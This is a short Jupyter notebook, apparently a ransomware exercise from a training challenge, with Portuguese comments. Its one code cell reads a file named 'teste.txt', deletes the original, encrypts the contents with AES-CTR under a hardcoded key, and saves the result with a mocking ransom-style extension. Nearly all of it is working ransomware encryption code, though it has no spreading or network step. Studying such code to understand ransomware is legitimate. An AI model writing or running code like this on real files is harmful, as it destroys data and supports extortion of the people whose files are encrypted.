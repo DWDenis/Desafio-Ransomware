{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Encriptador do file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import pyaes\n",
    "\n",
    "## abrir o arquivo a ser criptografado\n",
    "file_name = \"teste.txt\"\n",
    "file = open(file_name, \"rb\")\n",
    "file_data = file.read()\n",
    "file.close()\n",
    "\n",
    "## remove o arquivo\n",
    "os.remove(file_name)\n",
    "\n",
    "## chave de uso\n",
    "key = b\"testeransomwares\"\n",
    "aes = pyaes.AESModeOfOperationCTR(key)\n",
    "\n",
    "## criptografar o arquivo\n",
    "crypto_data = aes.encrypt(file_data)\n",
    "\n",
    "## salvar o arquivo criptografado\n",
    "new_file = file_name + \".achouqueeuestavabrincando\"\n",
    "new_file = open(f'{new_file}','wb')\n",
    "new_file.write(crypto_data)\n",
    "new_file.close()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
